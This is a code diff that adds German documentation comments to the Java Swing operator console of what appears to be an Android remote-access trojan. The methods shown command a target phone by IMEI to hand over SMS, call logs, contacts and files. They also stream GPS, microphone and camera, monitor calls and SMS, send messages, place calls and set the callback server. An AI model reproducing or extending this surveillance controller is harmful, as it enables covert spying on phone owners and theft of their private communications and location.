@@ -587,106 +587,224 @@ public class GUI extends javax.swing.JFrame {
     // *******************************
     //	M�thodes pour les UserGUI
     // *******************************
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um die Advanced Informations und die Einstellungen zu erhalten.
+     * @param imei  Die IMEI
+     */
     public void fireGetAdvInformations(String imei) {
     	server.commandSender(imei, Protocol.GET_ADV_INFORMATIONS, null);
     	server.commandSender(imei, Protocol.GET_PREFERENCE, null);
     }
-    
+
+    /**
+     * Die Methode ist zum Senden der Anfrage um die SMS zu erhalten. der String req sind die Filter nachdenen die SMS gefiltert werden sollen.
+     * @param imei  Die IMEI
+     * @param req   Die Filter
+     */
     public void fireGetSMS(String imei, String req) {
     	server.commandSender(imei, Protocol.GET_SMS, req.getBytes());
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um den GPS Stream zu aktivieren.
+     * @param imei  Die IMEI
+     * @param provider  Der Provider des Quelle
+     */
     public void fireStartGPSStreaming(String imei, String provider) {
     	server.commandSender(imei, Protocol.GET_GPS_STREAM, provider.getBytes());
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um den GPS Stream zu stoppen.
+     * @param imei  Die IMEI
+     * @param channel   Der Kanal
+     */
     public void fireStopGPSStreaming(String imei, int channel) {
     	server.commandStopSender(imei, Protocol.STOP_GPS_STREAM, null, channel);
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um den Sound Stream zu aktivieren.
+     * @param imei  Die IMEI
+     * @param source    Die Quelle des Sounds
+     */
     public void fireStartSoundStreaming(String imei, int source) {
     	byte[] byteSource = ByteBuffer.allocate(4).putInt(source).array();
     	server.commandSender(imei, Protocol.GET_SOUND_STREAM, byteSource);
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um den Sound Stream zu stoppen.
+     * @param imei  Die IMEI
+     * @param channel   Der Datenkanal
+     */
     public void fireStopSoundStreaming(String imei, int channel) {
     	server.commandStopSender(imei, Protocol.STOP_SOUND_STREAM, null, channel);
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um den Video Stream zu aktivieren.
+     * @param imei  Die IMEI
+     */
     public void fireStartVideoStream(String imei) {
     	server.commandSender(imei, Protocol.GET_VIDEO_STREAM, null);
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um den Video Stream zu stoppen.
+     * @param imei  Die IMEI
+     * @param channel   Der Kanal
+     */
     public void fireStopVideoStream(String imei, int channel) {
     	server.commandStopSender(imei, Protocol.STOP_VIDEO_STREAM, null, channel);
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um ein Bild aufzunehmen.
+     * @param imei Die IMEI
+     */
     public void fireTakePicture(String imei) {
     	server.commandSender(imei, Protocol.GET_PICTURE, null);
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um einen Ordner herunterzuladen.
+     * @param imei  Die IMEI
+     * @param path  Der Pfad
+     * @param downPath  Der Downpfad
+     * @param downName  Der Name
+     */
     public void fireFileDownload(String imei, String path, String downPath, String downName) {
     	server.commandFileSender(imei, Protocol.GET_FILE, path.getBytes(), downPath, downName);
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um die Ordnerstruktur zu erhalten.
+     * @param imei  Die IMEI
+     */
     public void fireTreeFile(String imei) {
     	server.commandSender(imei, Protocol.LIST_DIR, "/".getBytes());
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um ein Toast abzusetzen.
+     * @param imei  Die IMEI
+     * @param txt   Der Text des Toasts
+     */
     public void fireToastMessage(String imei, String txt) {
     	server.commandSender(imei, Protocol.DO_TOAST, txt.getBytes());
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um das Gerät eine bestimmte Zeit vibrieren zu lassen.
+     * @param imei  Die IMEI
+     * @param duration  Die Dauer in Millisekunden
+     */
     public void fireVibrate(String imei, Long duration) {
     	server.commandSender(imei, Protocol.DO_VIBRATE, EncoderHelper.encodeLong(duration));
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um eine bestimmte Webseite auf dem Gerät zu öffnen.
+     * @param imei  Die IMEI
+     * @param url   Die Url der Webseite
+     */
     public void fireBrowseUrl(String imei, String url) {
     	server.commandSender(imei, Protocol.OPEN_BROWSER, url.getBytes());
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um eine SMS zu senden.
+     * @param imei  DIe IMEI
+     * @param map   Die Sms Daten
+     */
     public void fireSendSMS(String imei, HashMap<String, String> map) {
     	byte[] data = EncoderHelper.encodeHashMap(map);
     	server.commandSender(imei, Protocol.SEND_SMS, data);
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um eine Anruf auf dem Gerät abzusetzen.
+     * @param imei  Die IMEI
+     * @param target    Die Telefonnummer
+     */
     public void fireGiveCall(String imei, String target) {
     	server.commandSender(imei, Protocol.GIVE_CALL, target.getBytes());
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um die Anrufliste zu erhalten.
+     * @param imei  Die IMEI
+     * @param request   Die Filter für die Liste.
+     */
     public void fireCallLogs(String imei, String request) {
     	server.commandSender(imei, Protocol.GET_CALL_LOGS, request.getBytes());
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um die Kontakte zu erhalten.
+     * @param imei  Die IMEI
+     */
     public void fireContacts(String imei) {
     	server.commandSender(imei, Protocol.GET_CONTACTS, null);
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um das Monitoren von Anrufen zu starten.
+     * @param imei  Die IMEI
+     * @param phoneNumbers  Die Telefonnummern nachdenen gefiltert werden soll.
+     */
     public void fireStartCallMonitoring(String imei, HashSet<String> phoneNumbers) {
     	server.commandSender(imei, Protocol.MONITOR_CALL, EncoderHelper.encodeHashSet(phoneNumbers));
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um das Monitoren von Anrufen zu stoppen.
+     * @param imei  Die IMEI
+     * @param channel   Der Datenkanal
+     */
     public void fireStopCallMonitoring(String imei, int channel) {
     	server.commandStopSender(imei, Protocol.STOP_MONITOR_CALL, null, channel);
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um das Monitoren von SMS zu starten.
+     * @param imei  Die IMEI
+     * @param phoneNumbers  Die Telefonnummern nach denen gefiltert wird.
+     */
     public void fireStartSMSMonitoring(String imei, HashSet<String> phoneNumbers) {
     	server.commandSender(imei, Protocol.MONITOR_SMS, EncoderHelper.encodeHashSet(phoneNumbers));
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um das Monitoren von SMS zu stoppen.
+     * @param imei  Die IMEI
+     * @param channel   Der Datenkanal
+     */
     public void fireStopSMSMonitoring(String imei, int channel) {
     	server.commandStopSender(imei, Protocol.STOP_MONITOR_SMS, null, channel);
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden der Anfrage um die Konfiguration zu speichern.
+     * @param imei  Die IMEI
+     * @param ip    Die IP
+     * @param port  Der Port
+     * @param wait  wait
+     * @param phones    Die Telefonliste
+     * @param sms   Die SMSnummernliste
+     * @param kw    Die Schlüsselwortliste
+     */
     public void fireSaveConnectConfiguration(String imei, String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
     	PreferencePacket pp = new PreferencePacket(ip, port, wait, phones, sms, kw);
     	server.commandSender(imei, Protocol.SET_PREFERENCE, pp.build());
     }
-    
-    
-    
-    
+
+
+    /**
+     * Diese Methode ist zum Absetzen des Toast zuständig. Hier wird der Dialog erstellt und die eingelesenen Daten im Anschluss per FireToastMessage abgesendet.
+     */
     private void fireBulkToast() {
     	String txt = JOptionPane.showInputDialog(this, "Enter your text :");
     	if(txt != null) {
@@ -696,7 +814,10 @@ public class GUI extends javax.swing.JFrame {
     		}
     	}
     }
-    
+
+    /**
+     * Diese Methode ist zum Senden einer SMS. Hier wird der SMSdialog gestartet und im Anschluss wird die SMS versendet.
+     */
     private void fireBulkSMS() {
     	SMSDialog dialog = new SMSDialog(this);
 		String[] res = dialog.showDialog();
@@ -711,7 +832,10 @@ public class GUI extends javax.swing.JFrame {
     		}
 		}
     }
-    
+
+    /**
+     * Diese Methode ist zum Absetzen eines Anrufs. Hierzu wird ein Dialog erstellt. Die eingegebenen Daten werden dann an das Gerät weitergeleitet.
+     */
     private void fireBulkCall() {
     	String target = JOptionPane.showInputDialog(this, "Enter the target cell number :");
     	if(target != null) {
@@ -721,22 +845,28 @@ public class GUI extends javax.swing.JFrame {
     		}
     	}
     }
-    
+
+    /**
+     * Diese Methode ist zum Einstellen des Ports auf dem der Server lauscht.
+     */
     private void fireSelectPort() {
     	String rep = JOptionPane.showInputDialog(this, "Enter the new server port (need server reboot) : ");
     	server.savePortConfig(rep);
     }
-    
+
+    /**
+     * Diese Methode ist zum erkennen ob und wo geklickt wurde.
+     * @param e Das Event
+     */
     private void userMouseClicked(MouseEvent e) {
     	if(e.getClickCount() == 2) {
 	    	this.buttonUserGUIActionPerformed();
     	}
     }
-    
-    
+
+
     /**
-     * Fonction g�n�rant les �l�ments SWING de l'interface graphique
-     * NE PAS TOUCHER !!
+     * Diese Funtkion ist zum erstellen der GUI. Hier werden die unterschiedlichen Schaltflächen erstellt und positioniert.
      */
     private void initComponents() {
     	
@@ -907,7 +1037,11 @@ public class GUI extends javax.swing.JFrame {
         
         pack();
     }
-    
+
+    /**
+     * Um die Tabelle der User in der Mitte des Fensters darzustellen.
+     * @param table Die Tabelle
+     */
     private void centrerTable(JTable table) {     DefaultTableCellRenderer custom = new DefaultTableCellRenderer(); 
 	    custom.setHorizontalAlignment(JLabel.CENTER);
 	    userTable.getColumnModel().getColumn(0).setPreferredWidth(56);
